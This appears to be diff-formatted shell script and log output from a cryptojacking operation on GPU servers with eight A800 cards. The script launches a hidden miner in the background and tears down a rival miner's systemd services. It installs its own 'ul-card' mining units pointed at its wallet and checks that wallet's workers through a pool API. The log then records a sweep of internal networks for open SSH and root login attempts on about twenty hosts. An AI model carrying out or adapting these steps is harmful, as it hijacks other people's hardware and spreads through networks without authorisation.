+setsid nohup nice -n 19 $B --algo pearlhash --url 127.0.0.1:17048 --user $W.$WN --pass x --opencl-devices 3 --gpu-intensity 1 --api-port 1903 > $L/w3relay.log 2>&1 &
+sleep 55
+echo "===RELAYLOG"
+grep -a -E "new job|accepted|rejected|error|author|difficulty|connect" $L/w3relay.log | tail -n 25
+if grep -qa "new job" $L/w3relay.log; then
+  echo "VERDICT RELAY_OK"
+else
+  echo "VERDICT RELAY_NOJOB"
+  pkill -f "wildrig-multi --algo pearlhash --url 127.0.0.1:17048"
+  sleep 3
+  /bin/sh /opt/t19/boot_wr.sh
+fi
+sleep 3
+echo "===PS"
+pgrep -fa "wildrig-multi" | head -n 8
+echo "END3"
+-- ps-miners
+1555457 /opt/arsenal/miners/krig/krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l/plh-123-184-7-135-g0 --password x -d 0 --api-port 13
+1555579 /opt/arsenal/miners/krig/krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l/plh-123-184-7-135-g1 --password x -d 1 --api-port 13
+1555725 /opt/arsenal/miners/krig/krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l/plh-123-184-7-135-g2 --password x -d 2 --api-port 13
+1555854 /opt/arsenal/miners/krig/krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l/plh-123-184-7-135-g3 --password x -d 3 --api-port 13
+1555977 /opt/arsenal/miners/krig/krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l/plh-123-184-7-135-g4 --password x -d 4 --api-port 13
+1556119 /opt/arsenal/miners/krig/krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l/plh-123-184-7-135-g5 --password x -d 5 --api-port 13
+1556254 /opt/arsenal/miners/krig/krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l/plh-123-184-7-135-g6 --password x -d 6 --api-port 13
+1556383 /opt/arsenal/miners/krig/krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l/plh-123-184-7-135-g7 --password x -d 7 --api-port 13
+-- crontab
+*/2 * * * * /usr/local/node_exporter/get_hardware_info_v3 high >> /var/log/hardware_info_high.log 2>&1
+0 * * * * /usr/local/node_exporter/get_hardware_info_v3 middle >> /var/log/hardware_info_middle.log 2>&1
+0 1 * * * /usr/local/node_exporter/get_hardware_info_v3 low >> /var/log/hardware_info_low.log 2>&1
+@reboot /usr/local/node_exporter/get_hardware_info_v3 once_boot >> /var/log/hardware_info_boot.log 2>&1
+31 21 * * * "/root/.acme.sh"/acme.sh --cron --home "/root/.acme.sh" > /dev/null
+0 2 * * * /ssd/vendors/QD_GLAD/npa_bicm/mysql/backup/scripts/backup.sh >>/ssd/vendors/QD_GLAD/npa_bicm/mysql/backup/scripts/backup.log 2>&1
+total 32
+drwxr-xr-x   2 root root  4096 Nov 25 05:33 .
+drwxr-xr-x 132 root root 12288 Nov  4 18:26 ..
+-rw-r--r--   1 root root   102 Mar 23  2022 .placeholder
+-rw-r--r--   1 root root   201 Jan  9  2022 e2scrub_all
+-rw-r--r--   1 root root    74 Nov 25 05:32 plh-keepalive
+-rw-r--r--   1 root root    75 Apr 16  2026 root
+### KIT
+total 16
+drwxr-xr-x 4 root root 4096 Nov 25 02:39 .
+drwxr-xr-x 3 root root 4096 Nov 25 02:34 ..
+drwxr-xr-x 2 root root 4096 Nov 25 02:39 krig
+drwxr-xr-x 2 root root 4096 Nov 25 02:35 wildrig
+total 131144
+drwxr-xr-x 2 root root      4096 Nov 24 02:14 .
+drwxr-xr-x 6 root root      4096 Nov 25 02:46 ..
+-rwxr-xr-x 1 root root 127812624 Nov 20 03:00 krig-miner
+-rwxr-xr-x 1 root root   6456136 Nov 20 03:00 libkrig_quantus_intel.so
+-rwxr-xr-x 1 root root       429 Nov 20 03:00 mine-pearl.sh
+/opt/t19/krig/krig-miner
+### NODEMAP
+HOSTLIST_COUNT 7
+-- getent
+RES g0023 fe80::966d:aeff:feab:c8dc
+-- resolv
+# This is /run/systemd/resolve/stub-resolv.conf managed by man:systemd-resolved(8).
+# Do not edit.
+#
+# This file might be symlinked as /etc/resolv.conf. If you're looking at
+# /etc/resolv.conf and seeing this text, you have followed the symlink.
+#
+# This is a dynamic resolv.conf file for connecting local clients to the
+# internal DNS stub resolver of systemd-resolved. This file lists all
+# configured search domains.
+#
+# Run "resolvectl status" to see details about the uplink DNS servers
+# currently in use.
+#
+# Third party programs should typically not access this file directly, but only
+# through the symlink at /etc/resolv.conf. To manage man:resolv.conf(5) in a
+# different way, replace this symlink by a static file or a different symlink.
+#
+# See man:systemd-resolved.service(8) for details about the supported modes of
+# operation for /etc/resolv.conf.
+
+nameserver 127.0.0.53
+options edns0 trust-ad
+search .
+### REPOINT135
+-- before
+GPU 0: NVIDIA A800-SXM4-80GB (UUID: GPU-1a616365-4581-31e6-1446-24a2457bc664)
+GPU 1: NVIDIA A800-SXM4-80GB (UUID: GPU-a1864ba2-3cb8-96bd-8b5e-b9161ef11bbc)
+GPU 2: NVIDIA A800-SXM4-80GB (UUID: GPU-d7dab522-fa0d-7fe8-dc36-3b395af93346)
+GPU 3: NVIDIA A800-SXM4-80GB (UUID: GPU-2ba4a927-d17a-4245-fcdc-77ea11b8dcc1)
+GPU 4: NVIDIA A800-SXM4-80GB (UUID: GPU-9b1adbd5-38c8-715d-a473-d70be061b8c9)
+GPU 5: NVIDIA A800-SXM4-80GB (UUID: GPU-12938f56-7015-a955-3656-20f28ed2e8c8)
+GPU 6: NVIDIA A800-SXM4-80GB (UUID: GPU-57bb3c06-75b7-39f2-167f-45223d4f35fa)
+GPU 7: NVIDIA A800-SXM4-80GB (UUID: GPU-933ea211-0623-e337-e5d3-83b489ca00db)
+0, 15683 MiB, 100 %
+1, 6327 MiB, 100 %
+2, 6327 MiB, 100 %
+3, 6327 MiB, 100 %
+4, 6327 MiB, 100 %
+5, 6327 MiB, 100 %
+6, 6327 MiB, 100 %
+7, 6749 MiB, 100 %
+-- foreign-argv
+/opt/arsenal/miners/krig/krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l/plh-123-184-7-135-g0 --password x -d 0 --api-port 1300
+/opt/arsenal/miners/krig/krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l/plh-123-184-7-135-g1 --password x -d 1 --api-port 1301
+-- neutralize keepalive surfaces
+DIS plh-card@0.service
+Removed /etc/systemd/system/multi-user.target.wants/plh-card@0.service.
+DIS plh-card@1.service
+Removed /etc/systemd/system/multi-user.target.wants/plh-card@1.service.
+DIS plh-card@2.service
+Removed /etc/systemd/system/multi-user.target.wants/plh-card@2.service.
+DIS plh-card@3.service
+Removed /etc/systemd/system/multi-user.target.wants/plh-card@3.service.
+DIS plh-card@4.service
+Removed /etc/systemd/system/multi-user.target.wants/plh-card@4.service.
+DIS plh-card@5.service
+Removed /etc/systemd/system/multi-user.target.wants/plh-card@5.service.
+DIS plh-card@6.service
+Removed /etc/systemd/system/multi-user.target.wants/plh-card@6.service.
+DIS plh-card@7.service
+Removed /etc/systemd/system/multi-user.target.wants/plh-card@7.service.
+KITBIN=/opt/t19/krig/krig-miner
+  instance name specified.
+  instance name specified.
+  instance name specified.
+  instance name specified.
+  instance name specified.
+  instance name specified.
+  instance name specified.
+  instance name specified.
+### REPOINT-AFTER
+-- units
+  UNIT              LOAD   ACTIVE SUB     DESCRIPTION
+  ul-card@0.service loaded active running UL PEARL card 0
+  ul-card@1.service loaded active running UL PEARL card 1
+  ul-card@2.service loaded active running UL PEARL card 2
+  ul-card@3.service loaded active running UL PEARL card 3
+  ul-card@4.service loaded active running UL PEARL card 4
+  ul-card@5.service loaded active running UL PEARL card 5
+  ul-card@6.service loaded active running UL PEARL card 6
+  ul-card@7.service loaded active running UL PEARL card 7
+
+LOAD   = Reflects whether the unit definition was properly loaded.
+ACTIVE = The high-level unit activation state, i.e. generalization of SUB.
+-- gpu
+0, 12651 MiB, 100 %
+1, 12651 MiB, 100 %
+2, 12651 MiB, 100 %
+3, 12651 MiB, 100 %
+4, 12651 MiB, 100 %
+5, 12651 MiB, 100 %
+6, 12651 MiB, 100 %
+7, 12651 MiB, 100 %
+-- ps
+3817305 /root/ul_plant/krig/krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user p
+3817353 /root/ul_plant/krig/krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user p
+3817402 /root/ul_plant/krig/krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user p
+### POOLAPI
+{"results":[{"miner":"prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz","worker":"ul-21-0-2-30-g0","scheme":"pps","status":"online","opened_at":1795561858936,"coin":"prl","last_share":1795560056256,"last_active":1795561858936,"valid":17,"stale":1,"invalid":0,"avg_hashrate_24h":"1876499844737.71","avg_hashrate_3h":"15011998757901.65","avg_hashrate_30m":"0","agent":"tw-pearl-miner/3.5.1","latest_agent":"tw-pearl-miner/3.5.1","download_url":"https://www.miner.download/en/tw-pearl-miner","country":"CN","legacy_port":false,"ru_v1":false,"server_geo":"eu"},{"miner":"prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz","worker":"ul-116-211-127-168-g0","scheme":"pps","status":"online","opened_at":1795561854065,"coin":"prl","last_share":1795561835171,"last_active":1795561854066,"valid":568,"stale":4,"invalid":0,"avg_hashrate_24h":"57650245229997.32","avg_hashrate_3h":"232685980747475.63","avg_hashrate_30m":"160127986750950.9688888888889","agent":"peakminer/2.20.7","latest_agent":"peakminer/2.21.0","download_url":"https://www.miner.download/en/peakminer","country":"CN","legacy_port":false,"ru_v1":false,"server_geo":"sg"},{"miner":"prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz","worker":"ul-21-0-2-130-g0","scheme":"pps","status":"online","opened_at":1795561845702,"coin":"prl","last_share":1795560831770,"last_active":1795561845702,"valid":14,"stale":1,"invalid":0,"avg_hashrate_24h":"1355249887866.12","avg_hashrate_3h":"10841999102928.97","avg_hashrate_30m":"25019997929836.08888888888889","agent":"tw-pearl-miner/3.5.1","latest_agent":"tw-pearl-miner/3.5.1","download_url":"https://www.miner.download/en/tw-pearl-miner","country":"CN","legacy_port":false,"ru_v1":false,"server_geo":null},{"miner":"prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz","worker":"ul-21-0-2-111-g0","scheme":"pps","status":"online","opened_at":1795561824611,"coin":"prl","last_share":1795561267091,"last_active":1795561824611,"valid":18,"stale":0,"invalid":0,"avg_hashrate_24h":"1042499913743.17","avg_hashrate_3h":"8339999309945.36","avg_hashrate_30m":"50039995859672.17777777777778","agent":"tw-pearl-miner/3.5.1","latest_agent":"tw-pearl-miner/3.5.1","download_url":"https://www.miner.download/en/tw-pearl-miner","country":"CN","legacy_port":false,"ru_v1":false,"server_geo":"eu"},{"miner":"prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz","worker":"ul-t2-123-184-7-135-g2","scheme":"pps","status":"online","opened_at":1795561809662,"coin":"prl","last_share":1795561870071,"last_active":1795561870069,"valid":118,"stale":1,"invalid":0,"avg_hashrate_24h":"12301498982169.41","avg_hashrate_3h":"56711995307628.47","avg_hashrate_30m":"5003999585967.217777777777778","agent":"krig/1.8.2","latest_agent":"krig/1.8.2","download_url":"https://www.miner.download/en/krig","country":"CN","legacy_port":false,"ru_v1":false,"server_geo":"sg"},{"miner":"prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz","worker":"ul-t2-123-184-7-135-g3","scheme":"pps","status":"online","opened_at":1795561807578,"coin":"prl","last_share":1795561826960,"last_active":1795561826959,"valid":115,"stale":0,"invalid":0,"avg_hashrate_24h":"11884499016672.14","avg_hashrate_3h":"55043995445639.4","avg_hashrate_30m":"5003999585967.217777777777778","agent":"krig/1.8.2","latest_agent":"krig/1.8.2","download_url":"https://www.miner.download/en/krig","country":"CN","legacy_port":false,"ru_v1":false,"server_geo":"sg"},{"miner":"prl1pek8rh8yjck5q7596aph
+### POOLAPI2
+
+<!doctype html>
+<html lang="en">
+<head>
+  <title>Not Found</title>
+</head>
+<body>
+  <h1>Not Found</h1><p>The requested resource was not found on this server.</p>
+</body>
+</html>
+### PEERSWEEP
+CAND 1016
+OPEN22 29
+OPEN22LIST 10.0.0.10 10.0.0.11 10.0.0.12 10.0.0.13 10.0.0.14 10.0.0.2 10.0.0.3 10.0.0.4 10.0.0.5 10.0.0.6 10.0.0.7 10.0.0.8 10.0.0.9 11.9.141.130 11.9.141.146 11.9.141.162 11.9.141.178 11.9.141.194 11.9.141.210 11.9.141.226 11.9.141.242 192.168.0.20 192.168.0.21 192.168.0.22 192.168.0.23 192.168.0.24 192.168.0.28 192.168.0.30 192.168.0.31
+-- auth+baseline on new open hosts (skip 11.9.141.*/192.168.0.23 = self)
+AUTH 10.0.0.10 :: Warning: Permanently added '10.0.0.10' (ED25519) to the list of known hosts.|root@10.0.0.10: Permission denied (publickey).|
+AUTH 10.0.0.11 :: Warning: Permanently added '10.0.0.11' (ED25519) to the list of known hosts.|root@10.0.0.11: Permission denied (publickey).|
+AUTH 10.0.0.12 :: Warning: Permanently added '10.0.0.12' (ED25519) to the list of known hosts.|root@10.0.0.12: Permission denied (publickey).|
+AUTH 10.0.0.13 :: Warning: Permanently added '10.0.0.13' (ED25519) to the list of known hosts.|root@10.0.0.13: Permission denied (publickey).|
+AUTH 10.0.0.14 :: Warning: Permanently added '10.0.0.14' (ED25519) to the list of known hosts.|root@10.0.0.14: Permission denied (publickey).|
+AUTH 10.0.0.2 :: Warning: Permanently added '10.0.0.2' (ED25519) to the list of known hosts.|root@10.0.0.2: Permission denied (publickey).|
+AUTH 10.0.0.3 :: Warning: Permanently added '10.0.0.3' (ED25519) to the list of known hosts.|root@10.0.0.3: Permission denied (publickey).|
+AUTH 10.0.0.4 :: Warning: Permanently added '10.0.0.4' (ED25519) to the list of known hosts.|root@10.0.0.4: Permission denied (publickey).|
+AUTH 10.0.0.5 :: Warning: Permanently added '10.0.0.5' (ED25519) to the list of known hosts.|root@10.0.0.5: Permission denied (publickey).|
+AUTH 10.0.0.6 :: Warning: Permanently added '10.0.0.6' (ED25519) to the list of known hosts.|root@10.0.0.6: Permission denied (publickey).|
+AUTH 10.0.0.7 :: Warning: Permanently added '10.0.0.7' (ED25519) to the list of known hosts.|root@10.0.0.7: Permission denied (publickey).|
+AUTH 10.0.0.8 :: Warning: Permanently added '10.0.0.8' (ED25519) to the list of known hosts.|root@10.0.0.8: Permission denied (publickey).|
+AUTH 10.0.0.9 :: Warning: Permanently added '10.0.0.9' (ED25519) to the list of known hosts.|root@10.0.0.9: Permission denied (publickey).|
+AUTH 192.168.0.20 :: Warning: Permanently added '192.168.0.20' (ED25519) to the list of known hosts.|root@192.168.0.20: Permission denied (publickey).|
+AUTH 192.168.0.21 :: Warning: Permanently added '192.168.0.21' (ED25519) to the list of known hosts.|root@192.168.0.21: Permission denied (publickey).|
+AUTH 192.168.0.22 :: Warning: Permanently added '192.168.0.22' (ED25519) to the list of known hosts.|root@192.168.0.22: Permission denied (publickey).|
+AUTH 192.168.0.24 :: Warning: Permanently added '192.168.0.24' (ED25519) to the list of known hosts.|root@192.168.0.24: Permission denied (publickey).|
+AUTH 192.168.0.28 :: Warning: Permanently added '192.168.0.28' (ED25519) to the list of known hosts.|root@192.168.0.28: Permission denied (publickey).|
+AUTH 192.168.0.30 :: Warning: Permanently added '192.168.0.30' (ED25519) to the list of known hosts.|root@192.168.0.30: Permission denied (publickey).|
+AUTH 192.168.0.31 :: Warning: Permanently added '192.168.0.31' (ED25519) to the list of known hosts.|root@192.168.0.31: Permission denied (publickey).|
+### DONE 2026-11-24T23:11:50Z
